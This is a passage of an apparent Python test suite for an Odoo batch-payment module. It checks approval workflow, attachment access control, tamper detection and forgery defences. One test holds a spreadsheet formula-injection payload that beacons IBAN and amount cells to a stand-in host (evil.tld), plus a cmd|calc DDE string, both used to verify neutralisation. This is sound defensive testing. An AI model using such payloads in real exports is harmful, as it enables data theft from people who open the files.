        )
        storage_patch.start()
        self.addCleanup(storage_patch.stop)
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        viewer = self._make_checker_manager()
        batch.with_user(viewer).action_post()
        Attachment = self.env['ir.attachment'].with_context(
            skip_res_field_check=True,
        )
        attachment = Attachment.search([
            ('res_model', '=', 'eh.batch.payment'),
            ('res_id', '=', batch.id),
            ('res_field', '=', 'export_file'),
        ])
        self.assertEqual(len(attachment), 1)
        self.assertFalse(
            attachment.db_datas,
            'protected export bytes must never use shared database storage',
        )
        trusted_context = {
            AUTHORIZED_BATCH_EXPORT_CONTEXT:
                AUTHORIZED_BATCH_EXPORT_CAPABILITY,
        }
        self.env.cr.execute(
            "SELECT store_fname, octet_length(db_datas), checksum, file_size "
            "FROM ir_attachment WHERE id = %s",
            (attachment.id,),
        )
        storage_row = self.env.cr.fetchone()
        self.assertEqual(
            attachment.sudo().with_context(**trusted_context).raw,
            base64.b64decode(
                batch.sudo().with_context(**trusted_context).export_file,
            ),
            'forced filestore migration must preserve exact export bytes: %r'
            % (storage_row,),
        )
        # Warm manager caches, then switch uid on the same transaction/cache.
        # Every direct byte descriptor must still enforce actor access.
        self.assertTrue(attachment.raw)
        self.assertTrue(attachment.datas)
        viewer.group_ids -= self.env.ref(
            'eh_account_base.group_eh_manager',
        )
        for field_name in ('raw', 'datas', 'db_datas'):
            with self.assertRaises(AccessError):
                attachment.with_user(viewer)[field_name]
        with self.assertRaises(AccessError):
            batch.with_user(viewer).export_file

        with self.assertRaises(AccessError):
            attachment.write({'name': 'mutated.csv'})
        with self.assertRaises(AccessError):
            attachment.unlink()
        forged_export_env = attachment.sudo().with_context(
            eh_authorized_batch_payment_export=True,
        )
        with self.assertRaises(AccessError):
            forged_export_env.write({'name': 'uid1-forged.csv'})
        with self.assertRaises(AccessError):
            forged_export_env.unlink()

        # Transitioning an ordinary attachment into the protected field used
        # to bypass a current-state-only write guard and could forge a second
        # field attachment.
        ordinary = self.env['ir.attachment'].create({
            'name': 'forged.csv',
            'raw': b'forged',
            'type': 'binary',
        })
        with self.assertRaises(AccessError):
            ordinary.write({
                'res_model': 'eh.batch.payment',
                'res_id': batch.id,
                'res_field': 'export_file',
            })

        with self.assertRaises(AccessError):
            Attachment.sudo().with_context(
                eh_authorized_batch_payment_export=True,
            ).create({
                'name': 'uid1-forged.csv',
                'raw': b'forged',
                'type': 'binary',
                'res_model': 'eh.batch.payment',
                'res_id': batch.id,
                'res_field': 'export_file',
            })
        ordinary.invalidate_recordset(['res_model', 'res_id', 'res_field'])
        self.assertNotEqual(ordinary.res_field, 'export_file')

        # Even a storage-level mutation through the private workflow corridor
        # is detected at both ORM and HTTP byte-serving boundaries.
        attachment.sudo().with_context(**{
            AUTHORIZED_BATCH_EXPORT_CONTEXT:
                AUTHORIZED_BATCH_EXPORT_CAPABILITY,
        }).write({'raw': b'tampered-bank-file'})
        attachment.invalidate_recordset()
        batch.invalidate_recordset(['export_file'])
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_export_csv()
        for field_name, record in (
            ('export_file', batch),
            ('raw', attachment),
            ('datas', attachment),
        ):
            record.invalidate_recordset([field_name])
            for attempt in range(2):
                try:
                    record[field_name]
                except UserError:
                    pass
                else:
                    self.fail(
                        '%s tamper read %d unexpectedly passed'
                        % (field_name, attempt + 1)
                    )
        attachment.invalidate_recordset(['db_datas'])
        self.assertFalse(
            attachment.db_datas,
            'filestore-only protected export must have no database bytes',
        )
        with self.assertRaisesRegex(UserError, r'\S'):
            attachment._to_http_stream()
        with self.assertRaisesRegex(UserError, r'\S'):
            self.env['ir.binary']._record_to_stream(attachment, 'raw')
        with self.assertRaisesRegex(UserError, r'\S'):
            self.env['ir.binary']._record_to_stream(batch, 'export_file')

        attachment.sudo().with_context(**{
            AUTHORIZED_BATCH_EXPORT_CONTEXT:
                AUTHORIZED_BATCH_EXPORT_CAPABILITY,
        }).write({'res_id': 2_000_000_000})
        attachment.invalidate_recordset()
        with self.assertRaises(AccessError):
            attachment._to_http_stream()

    def test_attachment_actor_cache_boundary_is_recordset_scoped(self):
        """Actor switches invalidate touched bytes, not every attachment."""
        created = self.env['ir.attachment'].create([{
            'name': 'ordinary-cache-first.txt',
            'raw': b'ordinary first',
            'type': 'binary',
        }, {
            'name': 'ordinary-cache-second.txt',
            'raw': b'ordinary second',
            'type': 'binary',
        }])
        # Browse separately so prefetching one byte field cannot expand the
        # measurement to the other attachment.
        first = self.env['ir.attachment'].browse(created[0].id)
        second = self.env['ir.attachment'].browse(created[1].id)
        first.invalidate_recordset(['raw'])
        second.invalidate_recordset(['raw'])
        viewer = self._make_checker_manager()
        AttachmentModel = type(self.env['ir.attachment'])
        real_file_read = AttachmentModel._file_read
        reads = []

        def _record_file_read(attachment, store_fname):
            reads.extend(attachment.ids)
            return real_file_read(attachment, store_fname)

        with patch.object(AttachmentModel, '_file_read', _record_file_read):
            self.assertEqual(first.raw, b'ordinary first')
            self.assertEqual(second.raw, b'ordinary second')
            reads.clear()
            # Repeated same-actor reads keep core's cached bytes.
            self.assertEqual(first.raw, b'ordinary first')
            self.assertFalse(reads)
            # Crossing the actor boundary drops only ``second``'s byte cache.
            self.assertEqual(second.with_user(viewer).raw, b'ordinary second')

        self.assertEqual(reads, [second.id])

    def test_export_csv_neutralises_formula_injection(self):
        """Free-form text columns (partner name, memo, reference, bank)
        that begin with a spreadsheet formula leader must be prefixed
        with an apostrophe so Excel/LibreOffice render them as literal
        text and cannot beacon the row's IBAN/amount on open. The
        machine-formatted amount column stays raw and parseable."""
        evil_name = '=HYPERLINK("http://evil.tld/x?d="&C2&D2,"ok")'
        evil_memo = '@SUM(1+1)*cmd|calc'
        attacker = self.env['res.partner'].create({'name': evil_name})

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': attacker.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
            'memo': evil_memo,
        })

        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        batch.action_export_csv()
        content = base64.b64decode(batch.export_file).decode('utf-8')

        reader = csv.reader(io.StringIO(content))
        rows = list(reader)
        # rows[0] is the trusted header; the payment row follows.
        data = rows[1]
        partner_cell = data[1]
        amount_cell = data[3]
        memo_cell = data[6]

        # The formula must be defused: the cell no longer starts with a
        # formula leader, and its literal value is the original prefixed
        # with a single apostrophe.
        self.assertEqual(partner_cell, "'" + evil_name)
        self.assertEqual(memo_cell, "'" + evil_memo)
        self.assertNotIn(
            partner_cell[:1], ('=', '+', '-', '@'),
            "Partner cell still begins with a formula leader.",
        )
        # The numeric amount column stays raw so the bank portal can parse
        # it (no stray apostrophe).
        self.assertEqual(amount_cell, "100.00")

    def test_export_context_cannot_smuggle_workflow_state(self):
        """The private generator corridor whitelists the complete vals set."""
        batch = self._make_batch_with_one_payment()
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.sudo().with_context(
                eh_authorized_batch_payment_export=True,
            ).write({
                'export_file': b'Zm9yZ2Vk',
                'export_filename': 'forged.csv',
            })
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.sudo().with_context(
                eh_authorized_batch_payment_export=True,
            ).write({
                'export_file': b'Zm9yZ2Vk',
                'export_filename': 'forged.csv',
                'state': 'posted',
            })
        self.assertEqual(batch.state, 'draft')
        self.assertFalse(batch.export_file)

    def test_create_cannot_forge_export_fields(self):
        with self.assertRaisesRegex(UserError, r'\S'):
            self.Batch.create({
                'journal_id': self.bank_journal.id,
                'batch_type': 'outbound',
                'export_file': base64.b64encode(b'forged'),
                'export_filename': 'forged.csv',
            })

    def test_export_is_immutable_and_repeated_action_is_idempotent(self):
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        first_action = batch.action_export_csv()
        first_payload = batch.export_file
        first_filename = batch.export_filename

        # Partner master data remains mutable after posting. A repeated click
        # must return the reviewed attachment, not silently regenerate it.
        self.partner_a.name = 'Changed after first bank export'
        second_action = batch.action_export_csv()

        self.assertEqual(second_action['url'], first_action['url'])
        self.assertEqual(batch.export_file, first_payload)
        self.assertEqual(batch.export_filename, first_filename)

    # ---- manager guard ----

    def test_post_requires_eh_manager(self):
        # Exercise the manager guard on an otherwise-postable confirmed batch;
        # a draft fixture would pass vacuously on the state precondition alone.
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()

        with self.assertRaisesRegex(
            UserError,
            'Only an EH Accounting Manager can post batch payments',
        ):
            batch.with_user(self.accountant_user).action_post()

        batch.invalidate_recordset(['state'])
        batch.payment_ids.invalidate_recordset(['state'])
        self.assertEqual(batch.state, 'confirmed')
        self.assertEqual(batch.payment_ids.state, 'draft')

    def test_post_unconfirmed_batch_blocked(self):
        """Maker-checker: a draft batch that was never confirmed must
        not post, even for a manager. The confirm (maker) step is not
        skippable."""
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        self.assertEqual(batch.state, 'draft')
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_post()
        # The batch must stay draft: no payment moved cash.
        self.assertEqual(batch.state, 'draft')

    def test_direct_state_and_audit_write_is_blocked(self):
        """RPC writes cannot forge the confirm transition or its actor."""
        batch = self._make_batch_with_one_payment()
        attacker = self._make_checker_manager()

        with self.assertRaises(AccessError):
            batch.with_user(attacker).write({
                'state': 'confirmed',
                'confirmed_at': '2026-04-15 12:00:00',
                'confirmed_by_id': attacker.id,
            })

        self.assertEqual(batch.state, 'draft')
        self.assertFalse(batch.confirmed_at)
        self.assertFalse(batch.confirmed_by_id)

        with self.assertRaises(AccessError):
            batch.with_user(SUPERUSER_ID).write({
                'state': 'confirmed',
                'confirmed_at': '2026-04-15 12:00:00',
                'confirmed_by_id': SUPERUSER_ID,
            })
        self.assertEqual(batch.state, 'draft')

        with self.assertRaises(AccessError):
            batch.with_user(attacker).write({
                'reversed_at': '2026-04-15 13:00:00',
                'reversed_by_id': attacker.id,
            })
        self.assertFalse(batch.reversed_at)
        self.assertFalse(batch.reversed_by_id)

    def test_create_cannot_forge_state_or_audit_fields(self):
        """A non-superuser-created batch is always born in draft."""
        attacker = self._make_checker_manager()
        batch = self.Batch.with_user(attacker).create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'state': 'confirmed',
            'confirmed_at': '2026-04-15 12:00:00',
            'confirmed_by_id': attacker.id,
        })

        self.assertEqual(batch.state, 'draft')
        self.assertFalse(batch.confirmed_at)
        self.assertFalse(batch.confirmed_by_id)

        with self.assertRaises(AccessError):
            self.Batch.with_user(SUPERUSER_ID).create({
                'journal_id': self.bank_journal.id,
                'batch_type': 'outbound',
                'state': 'confirmed',
                'confirmed_at': '2026-04-15 12:00:00',
                'confirmed_by_id': SUPERUSER_ID,
            })

    def test_post_rejects_confirmed_batch_without_confirmer(self):
        """Corrupt/legacy state cannot turn an empty confirmer into a pass."""
        batch = self._make_batch_with_one_payment()
        checker = self._make_checker_manager()
        self._sql_update_batch_fields(batch, {
            'state': 'confirmed',
            'confirmed_at': '2026-04-15 12:00:00',
            'confirmed_by_id': False,
        })

        with self.assertRaisesRegex(UserError, 'no verified confirmer'):
            batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'confirmed')

    def test_confirmed_batch_membership_is_frozen(self):
        """Neither side of the inverse relation can change after review."""
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        outsider = self.env['account.payment'].create({
            'partner_id': self.partner_b.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 50.0,
            'date': '2026-04-15',
        })
        checker = self._make_checker_manager()
        batch.action_confirm()

        with self.assertRaisesRegex(UserError, r'\S'):
            member.with_user(checker).write({'eh_batch_payment_id': False})
        with self.assertRaisesRegex(UserError, r'\S'):
            outsider.with_user(checker).write({
                'eh_batch_payment_id': batch.id,
            })
        with self.assertRaisesRegex(UserError, r'\S'):
            member.with_user(checker).unlink()
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.with_user(checker).unlink()
        with self.assertRaisesRegex(UserError, r'\S'):
            member.with_user(SUPERUSER_ID).unlink()
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.with_user(SUPERUSER_ID).unlink()

        self.assertEqual(batch.payment_ids, member)
        self.assertFalse(outsider.eh_batch_payment_id)

    def test_cancelled_batch_releases_membership(self):
        """Cancellation intentionally unlocks members for a new draft run."""
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        checker = self._make_checker_manager()
        batch.action_confirm()
        batch.action_cancel()

        if 'origin_payment_id' not in self.env['account.move']._fields:
            with self.assertRaisesRegex(UserError, 'batch Post workflow'):
                member.move_id.action_post()
            self._assert_unposted_payment_moves(member)
        member.with_user(checker).write({'eh_batch_payment_id': False})
        self.assertFalse(member.eh_batch_payment_id)
        self.assertEqual(batch.state, 'cancelled')

    def test_cancel_provenance_is_single_shot_and_reset_clears_attempt(self):
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        batch.action_cancel()
        cancelled_at = batch.cancelled_at
        cancelled_by = batch.cancelled_by_id

        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_cancel()
        self.assertEqual(batch.cancelled_at, cancelled_at)
        self.assertEqual(batch.cancelled_by_id, cancelled_by)

        batch.action_set_to_draft()
        self.assertFalse(batch.integrity_digest)
        self.assertFalse(batch.confirmed_at)
        self.assertFalse(batch.confirmed_by_id)
        self.assertFalse(batch.posted_at)
        self.assertFalse(batch.posted_by_id)
        self.assertFalse(batch.cancelled_at)
        self.assertFalse(batch.cancelled_by_id)

    def test_cross_company_guessed_batch_entrypoints_are_denied(self):
        """Public actions and assignment reject a guessed foreign batch id."""
        checker = self._make_checker_manager()
        other_company = self.env['res.company'].create({
            'name': 'Foreign Batch Company',
        })
        other_journal = self.env['account.journal'].sudo().create({
            'name': 'Foreign Batch Bank',
            'code': 'FBB',
            'type': 'bank',
            'company_id': other_company.id,
        })
        with self.assertRaises(AccessError):
            self.Batch.with_user(checker).create({
                'journal_id': other_journal.id,
                'company_id': other_company.id,
                'batch_type': 'outbound',
            })
        foreign_batch = self.Batch.sudo().create({
            'journal_id': other_journal.id,
            'company_id': other_company.id,
            'batch_type': 'outbound',
        }).with_user(checker)

        with self.assertRaises(AccessError):
            foreign_batch.action_open_build_wizard()
        with self.assertRaises(AccessError):
            foreign_batch.action_view_payments()
        with self.assertRaises(AccessError):
            foreign_batch.action_export_csv()
        with self.assertRaises(AccessError):
            foreign_batch.action_confirm()

        payment = self.env['account.payment'].with_user(checker).create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        with self.assertRaises(AccessError):
            payment.write({'eh_batch_payment_id': foreign_batch.id})

        wizard = self.Wizard.with_user(checker).create({
            'batch_id': foreign_batch.id,
        })
        with self.assertRaises(AccessError):
            wizard.action_build()

    def test_confirmed_batch_freezes_header_and_payment_financials(self):
        """RPC/ORM writes cannot change the reviewed cash instruction."""
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        batch.action_confirm()

        with self.assertRaisesRegex(UserError, r'\S'):
            batch.write({'payment_date': '2026-05-01'})
        with self.assertRaisesRegex(UserError, r'\S'):
            member.write({'amount': 999999.0})
        with self.assertRaisesRegex(UserError, r'\S'):
            member.write({'memo': 'changed after approval'})
        with self.assertRaisesRegex(UserError, r'\S'):
            member.action_post()
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.write({
                'export_file': b'ZmFrZSBiYW5rIGZpbGU=',
                'export_filename': 'forged.csv',
            })
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_export_csv()
        batch.with_user(self._make_checker_manager()).action_post()
        batch.action_export_csv()

        self.assertNotEqual(batch.payment_date, fields.Date.from_string(
            '2026-05-01',
        ))
        self.assertAlmostEqual(member.amount, 100.0)
        self.assertTrue(batch.export_file)
        self.assertTrue(batch.export_filename.endswith('.csv'))

    def test_forged_recipient_bank_is_rejected_atomically(self):
        evil_bank = self.env['res.partner.bank'].create({
            'partner_id': self.partner_b.id,
            'acc_number': 'ATTACKER-ACCOUNT',
            'allow_out_payment': True,
        })
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids

        with self.assertRaisesRegex(UserError, r'\S'):
            member.write({
                'available_partner_bank_ids': [(6, 0, evil_bank.ids)],
            })
        try:
            member.write({'partner_bank_id': evil_bank.id})
        except UserError:
            pass
        else:
            self.fail('forged recipient bank unexpectedly persisted')

        member.invalidate_recordset(['partner_bank_id'])
        self.assertFalse(member.partner_bank_id)

    def test_assignment_rejects_non_draft_payment(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        payment = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        payment.write({'state': self._payment_state_value('in_process')})

        with self.assertRaisesRegex(UserError, r'\S'):
            payment.write({'eh_batch_payment_id': batch.id})
        self.assertFalse(payment.eh_batch_payment_id)

    def test_assignment_rejects_prebuilt_move_on_modern_payment_api(self):
        Move = self.env['account.move']
        if 'origin_payment_id' not in Move._fields:
            self.skipTest(
                'legacy payment API delegates every payment to move_id',
            )
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        payment = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        move = Move.create({
            'move_type': 'entry',
            'journal_id': self.bank_journal.id,
            'date': '2026-04-15',
            'origin_payment_id': payment.id,
        })
        with self.assertRaisesRegex(UserError, r'\S'):
            payment.action_post()
        with self.assertRaisesRegex(UserError, r'\S'):
            payment.write({'move_id': move.id})

        with self.assertRaisesRegex(UserError, r'\S'):
            payment.write({'eh_batch_payment_id': batch.id})
        self.assertFalse(payment.eh_batch_payment_id)

    def test_expected_outstanding_account_uses_series_core_api(self):
        payment = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        payment.payment_method_line_id.payment_account_id = False
        if 'outstanding_account_id' in payment._fields:
            payment.invalidate_recordset(['outstanding_account_id'])

        if hasattr(payment, '_get_outstanding_account'):
            expected = payment._get_outstanding_account(
                payment.payment_type,
            )
        else:
            field_name = 'account_journal_payment_credit_account_id'
            self.assertIn(field_name, payment.company_id._fields)
            expected = payment.journal_id.company_id[field_name]

        self.assertTrue(expected)
        self.assertEqual(
            payment._eh_expected_outstanding_account(), expected,
        )

    def test_legacy_unbatched_edit_avoids_global_batch_lock(self):
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('modern payment edits do not sync a delegated move')
        payment = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        real_execute = self.env.cr.execute
        seen_params = []

        def _record_execute(query, params=None, *args, **kwargs):
            seen_params.append(params)
            return real_execute(query, params, *args, **kwargs)

        with patch.object(self.env.cr, 'execute', _record_execute):
            payment.write({'amount': 101.0})

        self.assertFalse(any(
            'eh_account_batch_payment.integrity.v1' in repr(params)
            for params in seen_params
        ))
        self.assertAlmostEqual(payment.amount, 101.0)

    def test_legacy_batch_member_create_keeps_capability_internal(self):
        Move = self.env['account.move']
        if 'origin_payment_id' in Move._fields:
            self.skipTest('modern payment API has no delegated draft move')
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })

        payment_vals = {
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        }
        with self.assertRaisesRegex(UserError, r'\S'):
            self.env['account.payment'].create({
                **payment_vals,
                'name': 'FORGED/2026/0001',
            })
        payment = self.env['account.payment'].create(payment_vals)

        self.assertEqual(payment.eh_batch_payment_id, batch)
        self.assertTrue(payment.move_id)
        self.assertTrue(payment.move_id.line_ids)
        self.assertNotIn(
            'eh_authorized_batch_member_mutation', payment.env.context,
        )
        original_prefix = payment.move_id.sequence_prefix
        with self.assertRaisesRegex(UserError, r'\S'):
            payment.move_id.with_context(
                eh_authorized_batch_member_mutation=True,
            ).write({'sequence_prefix': 'FORGED/'})
        payment.move_id.invalidate_recordset(['sequence_prefix'])
        self.assertEqual(payment.move_id.sequence_prefix, original_prefix)

    def test_reviewed_source_line_guard_is_end_to_end_and_atomic(self):
        """Exercise the public AML write seam without patching Odoo core."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        line = source.line_ids.filtered(
            lambda item: item.account_id.account_type == 'liability_payable',
        )
        original = (line.name, line.account_id.id, line.balance)

        with self.assertRaisesRegex(UserError, 'source are frozen'):
            line.write({'name': 'FORGED-REVIEWED-SOURCE-LINE'})

        line.invalidate_recordset(['name', 'account_id', 'balance'])
        self.assertEqual((line.name, line.account_id.id, line.balance), original)

    def test_draft_batch_member_cannot_post_outside_batch_workflow(self):
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        original_move = member.move_id

        with self.assertRaisesRegex(UserError, r'\S'):
            member.action_post()
        # UID 1 has env.su=True on every supported series. A plain context
        # boolean must still be rejected because RPC callers can forge it.
        with self.assertRaisesRegex(UserError, r'\S'):
            member.with_context(
                eh_authorized_batch_payment_post=True,
            ).action_post()
        with self.assertRaisesRegex(UserError, r'\S'):
            member.with_context(
                eh_authorized_direct_payment_post=True,
            ).action_post()
        checker = self._make_checker_manager()
        with self.assertRaisesRegex(UserError, r'\S'):
            member.with_user(checker).with_context(
                eh_authorized_batch_payment_post=True,
            ).action_post()
        state_value = self._payment_state_value('in_process')
        for context in (
            {},
            {'eh_authorized_batch_payment_post': True},
            {'eh_authorized_direct_payment_post': True},
        ):
            try:
                member.with_context(**context).write({'state': state_value})
            except UserError:
                pass
            else:
                self.fail('raw batch-member state write unexpectedly passed')
        shadow = self.env['account.move'].create({
            'move_type': 'entry',
            'journal_id': self.journal_misc.id,
            'date': '2026-04-15',
        })
        try:
            member.with_context(
                eh_authorized_direct_payment_post=True,
            ).write({'move_id': shadow.id})
        except UserError:
            pass
        else:
            self.fail('raw batch-member move link unexpectedly passed')
        self._assert_unposted_payment_moves(member)
        member.invalidate_recordset(['move_id'])
        self.assertEqual(member.move_id, original_move)
        self.assertEqual(batch.state, 'draft')

    def test_legacy_delegated_move_cannot_bypass_batch_post_workflow(self):
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('modern payment API has no pre-created draft move')
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        move = member.move_id
        original_name = move.name
        original_date = move.date
        original_line_ids = move.line_ids.ids

        with self.assertRaisesRegex(UserError, 'batch Post workflow'):
            move.action_post()
        # Plain catch: Odoo's assertRaises owns a savepoint and would conceal
        # prefix mutations. The private engine must reject before core changes
        # sequence/date/lines even when its caller catches the exception.
        try:
            move._post(soft=False)
        except UserError as exc:
            self.assertIn('batch Post workflow', str(exc))
        else:
            self.fail('direct delegated move _post unexpectedly succeeded')
        checker = self._make_checker_manager()
        with self.assertRaisesRegex(UserError, 'batch Post workflow'):
            move.with_user(checker).with_context(
                eh_authorized_batch_payment_post=True,
            ).write({'state': 'posted'})
        with self.assertRaisesRegex(UserError, 'batch Post workflow'):
            move.with_context(
                eh_authorized_batch_payment_post=True,
            ).write({'state': 'posted'})
        with self.assertRaisesRegex(UserError, 'batch Post workflow'):
            move.with_context(
                eh_authorized_direct_payment_post=True,
            ).write({'state': 'posted'})
        try:
            move.write({'state': 'cancel'})
        except UserError:
            pass
        else:
            self.fail('delegated member move cancellation unexpectedly passed')

        self._assert_unposted_payment_moves(member)
        move.invalidate_recordset(['name', 'date', 'line_ids'])
        self.assertEqual(move.name, original_name)
        self.assertEqual(move.date, original_date)
        self.assertEqual(move.line_ids.ids, original_line_ids)
        self.assertEqual(batch.state, 'draft')

    def test_legacy_delegated_move_lines_are_workflow_owned(self):
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('modern payment API has no pre-created draft move')
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        move = member.move_id
        member.write({'amount': 99.0})
        self.assertAlmostEqual(member.amount, 99.0)
        line = move.line_ids[0]
        original_line_ids = move.line_ids.ids
        original_partner = line.partner_id
        original_name = move.name
        batch.action_confirm()

        mutations = (
            (
                'direct line write',
                lambda: line.write({'partner_id': self.partner_b.id}),
            ),
            (
                'nested move line write',
                lambda: move.write({
                    'line_ids': [(1, line.id, {
                        'partner_id': self.partner_b.id,
                    })],
                }),
            ),
            (
                'move name write',
                lambda: move.write({'name': 'ATTACK/NUMBER'}),
            ),
            (
                'forged member mutation token',
                lambda: line.with_context(
                    eh_authorized_batch_member_mutation=True,
                ).write({'partner_id': self.partner_b.id}),
            ),
            (
                'raw residual write',
                lambda: line.write({
                    'amount_residual': line.amount_residual + 1.0,
                }),
            ),
            (
                'forged parent-state projection',
                lambda: line.write({'parent_state': 'posted'}),
            ),
            (
                'direct line create',
                lambda: self.env['account.move.line'].create({
                    'move_id': move.id,
                    'name': 'forged batch cash leg',
                    'account_id': self.account_revenue.id,
                    'debit': 1.0,
                }),
            ),
            ('direct line unlink', line.unlink),
        )
        for label, mutation in mutations:
            try:
                mutation()
            except UserError:
                pass
            else:
                self.fail('%s unexpectedly passed' % label)

        move.invalidate_recordset(['line_ids'])
        line.invalidate_recordset(['partner_id'])
        self.assertEqual(move.line_ids.ids, original_line_ids)
        self.assertEqual(line.partner_id, original_partner)
        self.assertEqual(move.name, original_name)

    def test_legacy_alias_payment_cannot_post_member_move(self):
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('modern payment API has no delegated draft move')
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        batch.action_confirm()
        alias = self.env['account.payment'].create({
            'partner_id': self.partner_b.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 25.0,
            'date': '2026-04-15',
        })
        self.env.cr.execute(
            "UPDATE account_payment SET move_id = %s WHERE id = %s",
            (member.move_id.id, alias.id),
        )
        alias.invalidate_recordset(['move_id', 'state'])

        try:
            alias.action_post()
        except UserError:
            pass
        else:
            self.fail('aliased payment posted reviewed member move')
        member.move_id.invalidate_recordset(['state'])
        self.assertEqual(member.move_id.state, 'draft')

    def test_legacy_payment_create_cannot_alias_existing_move(self):
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('modern payment API has no delegated draft move')
        owner = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 25.0,
            'date': '2026-04-15',
        })
        owner_move = owner.move_id
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        before_ids = set(self.env['account.payment'].search([]).ids)

        with self.assertRaisesRegex(UserError, r'\S'):
            self.env['account.payment'].create({
                'move_id': owner_move.id,
                'eh_batch_payment_id': batch.id,
                'partner_id': self.partner_b.id,
                'partner_type': 'supplier',
                'payment_type': 'outbound',
                'journal_id': self.bank_journal.id,
                'amount': 10.0,
                'date': '2026-04-15',
            })

        self.assertEqual(
            set(self.env['account.payment'].search([]).ids),
            before_ids,
        )
        owner.invalidate_recordset(['move_id'])
        owner_move.invalidate_recordset(['payment_id'])
        self.assertEqual(owner.move_id, owner_move)
        self.assertEqual(owner_move.payment_id, owner)
        self.assertFalse(batch.payment_ids)

    def test_legacy_corrupt_draft_cash_legs_cannot_join_batch(self):
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('modern payment API has no pre-created draft move')
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        payment = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        self.env.cr.execute(
            "UPDATE account_move_line SET debit = debit * 2, "
            "credit = credit * 2, balance = balance * 2 "
            "WHERE move_id = %s",
            (payment.move_id.id,),
        )
        payment.move_id.line_ids.invalidate_recordset([
            'debit', 'credit', 'balance',
        ])

        try:
            payment.write({'eh_batch_payment_id': batch.id})
        except UserError:
            pass
        else:
            self.fail('corrupt delegated cash legs unexpectedly joined batch')
        payment.invalidate_recordset(['eh_batch_payment_id'])
        self.assertFalse(payment.eh_batch_payment_id)

    def test_legacy_corrupt_cash_line_projection_cannot_join_batch(self):
